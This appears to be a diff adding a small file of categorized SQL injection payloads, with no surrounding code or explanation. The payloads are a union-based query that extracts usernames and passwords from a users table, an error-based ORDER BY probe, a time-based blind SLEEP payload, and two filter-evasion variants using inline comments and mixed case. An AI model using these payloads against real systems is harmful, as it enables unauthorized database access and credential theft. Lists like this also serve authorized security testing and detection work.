@@ -1,0 +1,5 @@
+[Union-Based] ' UNION SELECT null, username, password FROM users--
+[Error-Based] ' OR 1=1 ORDER BY 100--
+[Blind] ' AND SLEEP(5)--
+[WAF Bypass (comments)] '/**/UNION/**/SELECT/**/NULL--
+[Case Variation] ' uNIoN SeLEct null--
